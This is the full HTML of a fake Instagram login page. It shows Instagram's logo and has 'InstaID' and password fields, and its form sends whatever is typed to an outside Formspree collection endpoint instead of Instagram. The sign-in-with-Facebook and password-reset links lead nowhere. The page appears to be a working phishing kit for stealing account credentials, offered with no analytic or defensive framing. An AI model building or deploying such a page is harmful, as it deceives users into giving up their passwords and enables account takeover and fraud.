<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo" class="logo">

            <form action="https://formspree.io/f/myzdkveq"
  method="POST">
                <input type="text" placeholder="InstaID" required name='name2'>
                <input type="password" placeholder="Password" required name='name1'>
                <button type="submit">Log In</button>
               
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot">Forgot password?</a>
            </form>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
